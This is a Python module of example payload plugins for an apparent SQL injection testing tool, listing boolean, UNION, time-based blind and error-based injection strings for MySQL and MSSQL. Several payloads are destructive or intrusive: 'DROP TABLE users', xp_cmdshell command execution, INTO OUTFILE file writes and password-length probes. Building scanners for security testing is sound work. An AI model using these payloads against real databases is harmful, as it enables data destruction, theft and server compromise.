"""
Example Custom Payload Plugin
=============================

Demonstrates how to create a custom payload plugin.
"""

from typing import List, Dict, Any

from ..plugins.system import (
    PayloadPlugin,
    PluginMetadata,
)


class CustomPayloadPlugin(PayloadPlugin):
    """Example custom payload plugin for additional test cases."""
    
    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="custom_payloads",
            version="1.0.0",
            author="Security Researcher",
            description="Custom payloads for edge case SQL injection testing",
            plugin_type="payload"
        )
    
    def initialize(self, config: Dict[str, Any]) -> bool:
        return True
    
    def cleanup(self) -> None:
        pass
    
    def generate_payloads(self, context: Dict[str, Any]) -> List[str]:
        """Generate custom payloads based on context."""
        
        payloads = [
            "1' AND '1'='1",
            "' OR 'a'='a",
            "1; DROP TABLE users--",
            "1' WAITFOR DELAY '0:0:10'--",
            "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' AND EXIST(SELECT * FROM users)--",
            "'; EXEC xp_cmdshell('dir')--",
            "1' ORDER BY 100--",
            "' INTO OUTFILE '/tmp/test.txt'--",
        ]
        
        if context.get('database_type') == 'mysql':
            payloads.extend([
                "1' AND SLEEP(5)--",
                "' AND BENCHMARK(1000000,MD5('test'))--",
            ])
        elif context.get('database_type') == 'mssql':
            payloads.extend([
                "1'; WAITFOR DELAY '0:0:10'--",
                "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            ])
        
        return payloads
    
    def get_payload_types(self) -> List[str]:
        return [
            "boolean",
            "time_based",
            "union_based",
            "stacked_query",
        ]


class AdvancedTimeBasedPlugin(PayloadPlugin):
    """Plugin for advanced time-based blind SQL injection."""
    
    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="advanced_time",
            version="1.0.0",
            author="Security Researcher",
            description="Advanced time-based blind SQL injection payloads",
            plugin_type="payload"
        )
    
    def initialize(self, config: Dict[str, Any]) -> bool:
        return True
    
    def cleanup(self) -> None:
        pass
    
    def generate_payloads(self, context: Dict[str, Any]) -> List[str]:
        """Generate advanced time-based payloads."""
        
        payloads = [
            "1' AND (SELECT COUNT(*) FROM (SELECT 1 GROUP BY CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),FLOOR(RAND(0)*2)))x)--",
            "1' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='a' AND SLEEP(5)--",
            "1' AND (SELECT COUNT(*) FROM users WHERE LENGTH(password)>10)>0 AND SLEEP(5)--",
            "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
            "1' AND (SELECT COUNT(*) FROM sys.tables)>0 AND SLEEP(5)--",
        ]
        
        return payloads
    
    def get_payload_types(self) -> List[str]:
        return ["time_based", "blind"]